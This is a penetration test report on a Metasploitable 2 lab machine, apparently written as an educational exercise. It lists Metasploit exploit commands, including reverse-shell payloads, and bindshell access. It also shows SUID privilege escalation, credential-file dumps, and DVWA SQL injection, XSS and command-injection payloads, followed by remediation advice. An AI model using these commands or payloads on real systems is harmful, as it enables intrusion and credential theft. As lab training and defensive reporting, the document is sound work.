[VAPT_Report_Final.md](https://github.com/user-attachments/files/27218730/VAPT_Report_Final.md)
# Vulnerability Assessment and Penetration Testing (VAPT) Report

**Target:** Metasploitable 2  
**Tester:** [Your Name]  
**Date:** April 29-30, 2026  
**Classification:** Confidential  
**Report Version:** 2.0  

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Scope and Objectives](#scope-and-objectives)
3. [Methodology](#methodology)
4. [Tools Used](#tools-used)
5. [Environment Setup](#environment-setup)
6. [Reconnaissance & Enumeration](#reconnaissance--enumeration)
7. [Exploitation](#exploitation)
   - [Exploit 1 — vsftpd 2.3.4 Backdoor](#exploit-1--vsftpd-234-backdoor)
   - [Exploit 2 — Samba 3.0.20 Usermap Script](#exploit-2--samba-3020-usermap-script)
   - [Exploit 3 — MySQL Unauthenticated Access](#exploit-3--mysql-unauthenticated-access)
   - [Exploit 4 — Bindshell Port 1524](#exploit-4--bindshell-port-1524)
   - [Exploit 5 — PostgreSQL + SUID Nmap Privilege Escalation](#exploit-5--postgresql--suid-nmap-privilege-escalation)
   - [Exploit 6 — VNC Unauthenticated Access](#exploit-6--vnc-unauthenticated-access)
   - [Exploit 7 — UnrealIRCd Backdoor](#exploit-7--unrealircd-backdoor)
   - [Exploit 8 — Apache Tomcat Manager Upload](#exploit-8--apache-tomcat-manager-upload)
   - [Exploit 9 — Telnet Credential Sniffing](#exploit-9--telnet-credential-sniffing)
   - [Exploit 10 — SQL Injection (DVWA)](#exploit-10--sql-injection-dvwa)
   - [Exploit 11 — Stored XSS (DVWA)](#exploit-11--stored-xss-dvwa)
   - [Exploit 12 — Command Injection (DVWA)](#exploit-12--command-injection-dvwa)
8. [Findings Summary](#findings-summary)
9. [Risk Rating](#risk-rating)
10. [Recommendations](#recommendations)
11. [Conclusion](#conclusion)

---

## Executive Summary

This report presents the findings of a comprehensive Vulnerability Assessment and Penetration Test (VAPT) conducted on a Metasploitable 2 virtual machine in an isolated lab environment. The assessment was performed to identify security vulnerabilities, assess their severity, and provide actionable remediation guidance.

During the assessment, **12 critical vulnerabilities** were successfully exploited across multiple attack categories including network exploitation, web application attacks, privilege escalation, and credential sniffing.

### Key Findings:
- **Full root-level access** obtained via 6 independent attack vectors
- **Complete database compromise** including extraction of all user credentials
- **Web application vulnerabilities** including SQLi, XSS, and Command Injection
- **Plaintext credential capture** demonstrated via Wireshark packet analysis
- **Full visual desktop control** obtained via VNC
- **Privilege escalation** demonstrated from low-privilege user to root

**Overall Risk Rating: 🔴 CRITICAL**

> ⚠️ **Disclaimer:** This penetration test was conducted in a controlled lab environment on an intentionally vulnerable machine (Metasploitable 2). All activities were performed legally and ethically for educational purposes only. Never attempt these techniques on systems without explicit written permission.

---

## Scope and Objectives

### Scope
| Item | Details |
|---|---|
| Target IP | 192.168.x.x (Target) |
| Target OS | Linux 2.6.24 (Ubuntu 8.04) |
| Hostname | metasploitable |
| Environment | Isolated VirtualBox Lab |
| Attack Machine | Kali Linux |
| Attacker IP | 192.168.x.x (Attacker) |
| Test Type | Black Box Penetration Test |
| Duration | 1 Session |

### Objectives
- Identify all open ports and running services
- Detect known vulnerabilities in running services
- Exploit identified vulnerabilities in a controlled manner
- Demonstrate privilege escalation techniques
- Test web application security
- Document all findings with evidence
- Provide remediation recommendations

---

## Methodology

The assessment followed the industry-standard **PTES (Penetration Testing Execution Standard)** methodology:

```
┌─────────────────────────────────────────────────────────┐
│                   VAPT Methodology                       │
├──────────────┬──────────────────────────────────────────┤
│ Phase 1      │ Reconnaissance — Gather target info       │
│ Phase 2      │ Scanning — Identify open ports/services   │
│ Phase 3      │ Enumeration — Extract service details     │
│ Phase 4      │ Vulnerability Analysis — Find weaknesses  │
│ Phase 5      │ Exploitation — Exploit vulnerabilities    │
│ Phase 6      │ Post-Exploitation — Demonstrate impact    │
│ Phase 7      │ Reporting — Document findings             │
└──────────────┴──────────────────────────────────────────┘
```

---

## Tools Used

| Tool | Version | Purpose |
|---|---|---|
| **Nmap** | 7.x | Network scanning & service enumeration |
| **Metasploit Framework** | 6.x | Exploitation framework |
| **Wireshark** | 4.6.3 | Network packet analysis |
| **MySQL Client** | 8.x | Direct database access testing |
| **Web Browser** | Firefox | Web application testing |
| **Netcat (nc)** | - | Raw TCP connections |
| **VNC Viewer** | - | Remote desktop access |
| **Kali Linux** | 2024.x | Attacker operating system |

---

## Environment Setup

```
┌─────────────────────┐         ┌─────────────────────┐
│   Kali Linux        │         │  Metasploitable 2   │
│   (Attacker)        │◄───────►│  (Target)           │
│   192.168.x.x       │         │  192.168.x.x        │
└─────────────────────┘         └─────────────────────┘
         Both connected via Bridged Network Adapter
                    (Isolated Lab Environment)
```

---

## Reconnaissance & Enumeration

### Nmap Scan Command
```bash
nmap -sV -sC -A <target-ip>
```

**Flag Explanation:**
- `-sV` — Service version detection
- `-sC` — Default script scanning  
- `-A` — Aggressive scan (OS detection + traceroute)

### Scan Results — Open Ports

| Port | State | Service | Version | Risk |
|---|---|---|---|---|
| 21/tcp | open | FTP | vsftpd 2.3.4 | 🔴 Critical |
| 22/tcp | open | SSH | OpenSSH 4.7p1 | 🟡 Medium |
| 23/tcp | open | Telnet | Linux telnetd | 🔴 Critical |
| 25/tcp | open | SMTP | Postfix smtpd | 🟡 Medium |
| 53/tcp | open | DNS | ISC BIND 9.4.2 | 🟡 Medium |
| 80/tcp | open | HTTP | Apache 2.2.8 | 🔴 Critical |
| 111/tcp | open | RPCbind | 2 (RPC) | 🟡 Medium |
| 139/tcp | open | NetBIOS | Samba 3.X | 🔴 Critical |
| 445/tcp | open | SMB | Samba 3.0.20 | 🔴 Critical |
| 512/tcp | open | exec | netkit-rsh | 🔴 Critical |
| 513/tcp | open | login | rlogind | 🔴 Critical |
| 1099/tcp | open | java-rmi | GNU Classpath | 🟡 Medium |
| 1524/tcp | open | bindshell | Root shell | 🔴 Critical |
| 2049/tcp | open | NFS | 2-4 (RPC) | 🟠 High |
| 3306/tcp | open | MySQL | 5.0.51a | 🔴 Critical |
| 3632/tcp | open | distccd | distccd | 🔴 Critical |
| 5432/tcp | open | PostgreSQL | 8.3.0 | 🔴 Critical |
| 5900/tcp | open | VNC | Protocol 3.3 | 🔴 Critical |
| 6000/tcp | open | X11 | - | 🟡 Medium |
| 6667/tcp | open | IRC | UnrealIRCd | 🔴 Critical |
| 8009/tcp | open | AJP | Apache Jserv | 🟠 High |
| 8180/tcp | open | HTTP | Apache Tomcat 5.5 | 🔴 Critical |

**Key Observations:**
- **22 open ports** — massive attack surface
- Target running **Linux kernel 2.6.24 (2008)** — severely outdated
- **Anonymous FTP** login allowed
- **SMB message signing** disabled
- Multiple services with **known critical CVEs**

---

## Exploitation

### Exploit 1 — vsftpd 2.3.4 Backdoor

**CVE:** CVE-2011-2523 | **CVSS:** 10.0 | **Severity:** 🔴 Critical

#### Description
vsftpd 2.3.4 contained a malicious backdoor planted in its source code in 2011. Sending a username containing `:)` triggers the backdoor, opening a root shell on port 6200.

#### Commands Used
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip>
exploit
```

#### Evidence
```
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
```

#### Post-Exploitation
```bash
whoami          # root
id              # uid=0(root) gid=0(root)
cat /etc/shadow # Dumped all password hashes
uname -a        # Linux metasploitable 2.6.24-16-server
hostname        # metasploitable
```

**Impact:** Full root access. Complete system compromise via FTP service backdoor.

---

### Exploit 2 — Samba 3.0.20 Usermap Script

**CVE:** CVE-2007-2447 | **CVSS:** 10.0 | **Severity:** 🔴 Critical

#### Description
Samba 3.0.0–3.0.25rc3 allows command injection via shell metacharacters in the username field, resulting in unauthenticated remote code execution as root.

#### Commands Used
```bash
use exploit/multi/samba/usermap_script
set RHOSTS <target-ip>
exploit
```

#### Evidence
```
[*] Started reverse TCP handler on <attacker-ip>:4444
[*] Command shell session 2 opened
```

**Impact:** Second independent root shell obtained. Demonstrates multiple attack vectors to root.

---

### Exploit 3 — MySQL Unauthenticated Access

**Severity:** 🔴 Critical

#### Description
MySQL root account had no password configured, allowing direct unauthenticated access to all databases.

#### Commands Used
```bash
mysql -h <target-ip> -u root --skip-ssl
```

#### Evidence
```sql
show databases;
use dvwa;
select * from users;
```

#### Credentials Dumped
| Username | Password Hash (MD5) |
|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 ("password") |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 ("password") |

**Impact:** Complete database compromise. All user credentials exposed including MD5 hashed passwords.

---

### Exploit 4 — Bindshell Port 1524

**Severity:** 🔴 Critical

#### Description
Port 1524 had a root shell bound to it with zero authentication — anyone on the network could connect and instantly get root access.

#### Commands Used
```bash
nc <target-ip> 1524
```

#### Evidence
```
root@metasploitable:/#
uid=0(root) gid=0(root)
```

**Impact:** Instant root access with single command. No exploit or credentials required.

---

### Exploit 5 — PostgreSQL + SUID Nmap Privilege Escalation

**Severity:** 🔴 Critical

#### Description
Two-stage attack: First gained access via PostgreSQL default credentials, then escalated to root using SUID bit set on old Nmap binary. This demonstrates a complete **Local Privilege Escalation (LPE)** attack chain.

#### Stage 1 — PostgreSQL Access
```bash
use exploit/linux/postgres/postgres_payload
set RHOSTS <target-ip>
set USERNAME postgres
set PASSWORD postgres
set LHOST <attacker-ip>
exploit
```

#### Stage 2 — SUID Nmap Privilege Escalation
```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Exploit Nmap interactive mode
nmap --interactive
!sh

# Verify root
whoami  # root
```

#### Attack Chain
```
Initial Access          →  Privilege Escalation  →  Root
(postgres user via DB)     (SUID Nmap exploit)      (uid=0)
```

**Impact:** Demonstrates real-world attack chain from low-privilege to root via SUID misconfiguration.

---

### Exploit 6 — VNC Unauthenticated Access

**Severity:** 🔴 Critical

#### Description
VNC service running on port 5900 with a weak default password, allowing full graphical desktop access to the target system.

#### Commands Used
```bash
vncviewer <target-ip>
# Password: password
```

**Impact:** Full visual and interactive desktop control. Attacker can see and control everything on screen in real time.

---

### Exploit 7 — UnrealIRCd Backdoor

**CVE:** CVE-2010-2075 | **Severity:** 🔴 Critical

#### Description
UnrealIRCd 3.2.8.1 contained a malicious backdoor in its source code — another supply chain attack similar to vsftpd. Sending a specific string to the IRC service triggers remote code execution as root.

#### Commands Used
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS <target-ip>
set LHOST <attacker-ip>
set PAYLOAD cmd/unix/reverse
exploit
```

#### Evidence
```
[*] Connected to <target-ip>:6667
[*] Sending backdoor command...
[*] Command shell session 2 opened
```

**Impact:** Root shell via IRC service. Second example of supply chain attack on this system.

---

### Exploit 8 — Apache Tomcat Manager Upload

**Severity:** 🔴 Critical

#### Description
Apache Tomcat 5.5 running on port 8180 with default credentials (`tomcat:tomcat`). The Tomcat Manager interface was used to deploy a malicious WAR file, resulting in a Meterpreter shell.

#### Steps
1. Accessed Tomcat Manager at `http://<target>:8180/manager/html`
2. Logged in with default credentials `tomcat:tomcat`
3. Used Metasploit to upload malicious WAR file

#### Commands Used
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target-ip>
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST <attacker-ip>
exploit
```

#### Evidence
```
[*] Uploading and deploying malicious WAR...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: tomcat55
meterpreter > sysinfo
Computer: metasploitable
OS: Ubuntu 8.04 (Linux 2.6.24-16-server)
```

**Impact:** Meterpreter shell via web application. Full filesystem access as Tomcat service user.

---

### Exploit 9 — Telnet Credential Sniffing

**Severity:** 🔴 Critical

#### Description
Telnet transmits all data including credentials in plain text. Combined with Wireshark packet capture, this demonstrates how easily credentials can be intercepted on a network.

#### Attack Steps

**Step 1 — Connect via Telnet:**
```bash
telnet <target-ip>
# Username: msfadmin
# Password: msfadmin
```

**Step 2 — Escalate to root:**
```bash
sudo su
# Password: msfadmin
whoami  # root
```

**Step 3 — Capture credentials with Wireshark:**
```
Filter: telnet
Right click packet → Follow → TCP Stream
```

#### Evidence
Wireshark TCP Stream showed complete session in plaintext:
```
metasploitable login: msfadmin
Password: msfadmin
msfadmin@metasploitable:~$ sudo su
root@metasploitable:~#
```

**Impact:** Credentials captured in plaintext. Demonstrates why Telnet is banned in modern networks and SSH must be used instead.

---

### Exploit 10 — SQL Injection (DVWA)

**Severity:** 🔴 Critical

#### Description
DVWA's SQL Injection module was vulnerable to both authentication bypass and UNION-based injection, allowing complete database dumping without any tools.

#### Stage 1 — Authentication Bypass
```sql
1' OR '1'='1
```
Returned all users from database.

#### Stage 2 — UNION Based Injection
```sql
1' UNION SELECT user, password FROM users#
```

#### Result
All usernames and MD5 password hashes extracted directly from the database via browser input field.

**Impact:** Complete database compromise via manual SQL injection. No tools required — demonstrates deep understanding of web vulnerabilities.

---

### Exploit 11 — Stored XSS (DVWA)

**Severity:** 🔴 Critical

#### Description
DVWA's Stored XSS module accepted unsanitized JavaScript input that was stored in the database and executed in every visitor's browser.

#### Payload Used
```javascript
<script>alert('Stored XSS! Your cookies are mine!')</script>
```

#### Difference: Reflected vs Stored XSS
| Type | Persistence | Impact |
|---|---|---|
| Reflected XSS | Only affects clicking victim | 🟠 High |
| Stored XSS | Affects ALL visitors permanently | 🔴 Critical |

**Impact:** Persistent JavaScript execution in all visitors' browsers. Can be used for cookie theft, session hijacking, and phishing.

---

### Exploit 12 — Command Injection (DVWA)

**Severity:** 🔴 Critical

#### Description
DVWA's Command Execution module passed user input directly to the OS without sanitization, allowing arbitrary system commands to be executed via a web form.

#### Payloads Used
```bash
# Stage 1 — Identify OS user
127.0.0.1; whoami
# Result: www-data

# Stage 2 — Dump system users
127.0.0.1; cat /etc/passwd
# Result: Full /etc/passwd including backdoor user "hacker"
```

**Impact:** Remote OS command execution via web form. Complete server compromise through a simple ping input field.

---

## Findings Summary

| # | Finding | Port | Category | Severity | Exploited |
|---|---|---|---|---|---|
| F-01 | vsftpd 2.3.4 Backdoor | 21 | Network | 🔴 Critical | ✅ |
| F-02 | Samba 3.0.20 Usermap | 445 | Network | 🔴 Critical | ✅ |
| F-03 | MySQL No Authentication | 3306 | Database | 🔴 Critical | ✅ |
| F-04 | Bindshell Open on 1524 | 1524 | Network | 🔴 Critical | ✅ |
| F-05 | PostgreSQL Default Creds | 5432 | Database | 🔴 Critical | ✅ |
| F-06 | SUID Nmap Privesc | N/A | Privilege Escalation | 🔴 Critical | ✅ |
| F-07 | VNC Weak Authentication | 5900 | Network | 🔴 Critical | ✅ |
| F-08 | UnrealIRCd Backdoor | 6667 | Network | 🔴 Critical | ✅ |
| F-09 | Tomcat Default Creds | 8180 | Web App | 🔴 Critical | ✅ |
| F-10 | Telnet Plaintext Protocol | 23 | Network | 🔴 Critical | ✅ |
| F-11 | SQL Injection | 80 | Web App | 🔴 Critical | ✅ |
| F-12 | Stored XSS | 80 | Web App | 🔴 Critical | ✅ |
| F-13 | Command Injection | 80 | Web App | 🔴 Critical | ✅ |
| F-14 | Anonymous FTP Login | 21 | Network | 🟠 High | ✅ |
| F-15 | Outdated Linux Kernel | N/A | Patching | 🟡 Medium | ⚠️ |
| F-16 | SMB Signing Disabled | 445 | Network | 🟡 Medium | ⚠️ |
| F-17 | Apache 2.2.8 Outdated | 80 | Web App | 🟡 Medium | ⚠️ |

---

## Risk Rating

```
🔴 Critical  →  13 findings  (Immediate action required)
🟠 High      →   1 finding   (Action required within 7 days)
🟡 Medium    →   3 findings  (Action required within 30 days)
🟢 Low       →   0 findings
```

**Overall Risk Rating: 🔴 CRITICAL**

---

## Recommendations

### Critical — Fix Immediately

| Finding | Recommendation |
|---|---|
| vsftpd Backdoor | Upgrade to vsftpd 3.0.5+. Disable FTP if not needed |
| Samba Exploit | Upgrade to Samba 3.0.26+. Restrict SMB access |
| MySQL No Password | Set strong root password. Bind to localhost only |
| Bindshell Port 1524 | Close port immediately. Audit for backdoors |
| PostgreSQL Default Creds | Change default credentials immediately |
| SUID Nmap | Remove SUID bit: `chmod u-s /usr/bin/nmap` |
| VNC Weak Auth | Upgrade VNC. Use strong password + firewall |
| UnrealIRCd | Upgrade or disable IRC service |
| Tomcat Default Creds | Change tomcat credentials. Restrict manager access |
| Telnet | Disable Telnet. Use SSH exclusively |
| SQL Injection | Use parameterized queries/prepared statements |
| XSS | Implement input validation and output encoding |
| Command Injection | Never pass user input directly to OS commands |

---

## Conclusion

This penetration test revealed a **severely compromised system** with 13 critical vulnerabilities successfully exploited across 4 attack categories:

| Category | Exploits |
|---|---|
| Network Exploitation | vsftpd, Samba, Bindshell, UnrealIRCd, Telnet, VNC |
| Database Attacks | MySQL, PostgreSQL, SQL Injection |
| Web Application | Tomcat, SQLi, XSS, Command Injection |
| Privilege Escalation | SUID Nmap |

The system demonstrated virtually every major vulnerability class known in cybersecurity. **No security controls were effective** — the system was fully compromised through multiple independent attack paths within a single session.

**Immediate remediation of all critical findings is required.**

---

## References

| Reference | Link |
|---|---|
| CVE-2011-2523 (vsftpd) | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523 |
| CVE-2007-2447 (Samba) | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447 |
| CVE-2010-2075 (UnrealIRCd) | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075 |
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
| PTES Standard | http://www.pentest-standard.org/ |
| Metasploitable 2 | https://docs.rapid7.com/metasploit/metasploitable-2/ |

---

*Report prepared for educational purposes as part of a cybersecurity lab exercise.*  
*All testing performed in an isolated environment on intentionally vulnerable software.*  
*Never perform these techniques on systems without explicit written permission.*
